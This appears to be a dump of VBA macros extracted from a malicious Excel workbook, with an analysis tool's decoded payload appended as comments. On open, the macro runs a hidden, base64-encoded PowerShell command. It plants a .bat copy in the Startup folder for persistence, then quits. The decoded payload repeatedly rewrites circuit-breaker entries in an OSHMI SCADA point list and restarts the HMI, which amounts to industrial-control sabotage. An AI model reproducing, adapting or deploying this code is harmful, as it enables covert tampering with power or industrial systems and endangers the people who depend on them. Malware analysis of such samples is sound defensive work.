Attribute VB_Name = "Module1"
Sub RunAndGetCmd()
    
    Set objFSO = CreateObject("Scripting.FileSystemObject")

' How to write file
    a = "dwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAkAGYAaQBsAGUAPQAiAEMAOgBcAG8AcwBoAG0AaQBcAGMAbwBuAGYAXABwAG8AaQBuAHQAXwBsAGkAcwB0AC4AdAB4AHQAIgA7ACAAJAByAGUAZwBlAHgAPQAiACgAPwA8AD0AMwA4ADAANQA2ACAAIAAgACAAIAAgACAAMAAgAEsATwBSADEASQBCAC0ALQBjAFgA"
    b = "QwBCAFIAMgA0ADAAMQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAIABPAEYARgAvAE8ATgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAyACAAIAAgADIANwAgACAAIAAgADAAIAAgACAAIAAwACAA"
    c = "IAAgAEUAIAAgACAAIAAwACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAMQAuADAAMAAwADAAIAAgACAAIAAgACAAIAAwAC4AMAAwADAAMAAgACAAIAAgACAAIAAgADAAIAAgACAAMgAgACAAIAAwACAAIAAgACAAIAAgACAAKQAuACIAOwAgACQAcgBlAGcAZQB4ADIAPQAiACgAPwA8AD0AMwA4ADAANQAxACAA"
    d = "IAAgACAAIAAgACAAMAAgAEsATwBSADEAQQBMADEAMQAtAFgAQwBCAFIANQAyADAANwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAIABPAEYARgAvAE8ATgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA"
    e = "IAAyACAAIAAgADIANwAgACAAIAAgADAAIAAgACAAIAAwACAAIAAgAEUAIAAgACAAIAAwACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAMQAuADAAMAAwADAAIAAgACAAIAAgACAAIAAwAC4AMAAwADAAMAAgACAAIAAgACAAIAAgADAAIAAgACAAMgAgACAAIAAwACAAIAAgACAAIAAgACAAKQAuACIAOwAgACgA"
    f = "RwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAkAHIAZQBnAGUAeAAsACAAIgAxACIAIAB8ACAAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlADsAIAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACQAZgBpAGwAZQApACAALQByAGUAcABsAGEA"
    g = "YwBlACAAJAByAGUAZwBlAHgAMgAsACAAIgAxACIAIAB8ACAAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlADsAIABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAiAEMAOgBcAG8AcwBoAG0AaQBcAGIAaQBuAFwA"
    h = "cwB0AG8AcABfAGEAbABsAC4AYgBhAHQAIgApADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAA4ADsAIABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAiAEMAOgBcAG8AcwBoAG0AaQBcAGIAaQBuAFwAcwB0AGEA"
    i = "cgB0AF8AaABtAGkALgBiAGEAdAAiACkAOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AcwAgADYAMAA7AH0A"
    Final = a & b & c & d & e & f & g & h & i
    outFile = "c:\Users\Win Server\Desktop\aaa.bat"
    Set objFile = objFSO.CreateTextFile(outFile, True)
    objFile.Write "powershell.exe -WindowStyle hidden -EncodedCommand " & Final & vbCrLf
    objFile.Close

End Sub


Attribute VB_Name = "Module2"
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Sub Workbook_Open()
    
    Dim a As String
    Dim b As String
    Dim c As String
    Dim d As String
    Dim e As String
    Dim f As String
    Dim g As String
    Dim h As String
    Dim i As String
    Dim Final As String
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    a = "dwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAkAGYAaQBsAGUAPQAiAEMAOgBcAG8AcwBoAG0AaQBcAGMAbwBuAGYAXABwAG8AaQBuAHQAXwBsAGkAcwB0AC4AdAB4AHQAIgA7ACAAJAByAGUAZwBlAHgAPQAiACgAPwA8AD0AMwA4ADAANQA2ACAAIAAgACAAIAAgACAAMAAgAEsATwBSADEASQBCAC0ALQBjAFgA"
    b = "QwBCAFIAMgA0ADAAMQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAIABPAEYARgAvAE8ATgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAyACAAIAAgADIANwAgACAAIAAgADAAIAAgACAAIAAwACAA"
    c = "IAAgAEUAIAAgACAAIAAwACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAMQAuADAAMAAwADAAIAAgACAAIAAgACAAIAAwAC4AMAAwADAAMAAgACAAIAAgACAAIAAgADAAIAAgACAAMgAgACAAIAAwACAAIAAgACAAIAAgACAAKQAuACIAOwAgACQAcgBlAGcAZQB4ADIAPQAiACgAPwA8AD0AMwA4ADAANQAxACAA"
    d = "IAAgACAAIAAgACAAMAAgAEsATwBSADEAQQBMADEAMQAtAFgAQwBCAFIANQAyADAANwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAIABPAEYARgAvAE8ATgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA"
    e = "IAAyACAAIAAgADIANwAgACAAIAAgADAAIAAgACAAIAAwACAAIAAgAEUAIAAgACAAIAAwACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAMQAuADAAMAAwADAAIAAgACAAIAAgACAAIAAwAC4AMAAwADAAMAAgACAAIAAgACAAIAAgADAAIAAgACAAMgAgACAAIAAwACAAIAAgACAAIAAgACAAKQAuACIAOwAgACgA"
    f = "RwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAkAHIAZQBnAGUAeAAsACAAIgAxACIAIAB8ACAAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlADsAIAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACQAZgBpAGwAZQApACAALQByAGUAcABsAGEA"
    g = "YwBlACAAJAByAGUAZwBlAHgAMgAsACAAIgAxACIAIAB8ACAAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlADsAIABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAiAEMAOgBcAG8AcwBoAG0AaQBcAGIAaQBuAFwA"
    h = "cwB0AG8AcABfAGEAbABsAC4AYgBhAHQAIgApADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAA4ADsAIABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAiAEMAOgBcAG8AcwBoAG0AaQBcAGIAaQBuAFwAcwB0AGEA"
    i = "cgB0AF8AaABtAGkALgBiAGEAdAAiACkAOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AcwAgADYAMAA7AH0A"
    Final = a & b & c & d & e & f & g & h & i
    strCommand = "powershell.exe -WindowStyle hidden -EncodedCommand " & Final
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run (strCommand)
    outFile = "C:\Users\Win Server\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\aaa.bat"
    Set objFile = objFSO.CreateTextFile(outFile, True)
    objFile.Write "powershell.exe -WindowStyle hidden -EncodedCommand " & Final & vbCrLf
    objFile.Close
    ThisWorkbook.Saved = True
    Application.Quit

End Sub

' InQuest injected base64 decoded content
' while($true){$file="C:\oshmi\conf\point_list.txt"; $regex="(?<=38056       0 KOR1IB--cX
' CBR2401                      D OFF/ON                                 2   27    0    0 
'   E    0     0       1.0000       0.0000       0   2   0       )."; $regex2="(?<=38051 
'       0 KOR1AL11-XCBR5207                      D OFF/ON                                
'  2   27    0    0   E    0     0       1.0000       0.0000       0   2   0       )."; (
' Get-Content $file) -replace $regex, "1" | Set-Content $file; (Get-Content $file) -repla
' ce $regex2, "1" | Set-Content $file; [System.Diagnostics.Process]::Start("C:\oshmi\bin\
' stop_all.bat"); Start-Sleep -s 8; [System.Diagnostics.Process]::Start("C:\oshmi\bin\sta
' rt_hmi.bat"); Start-Sleep -s 60;}

INQUEST-PP=macro
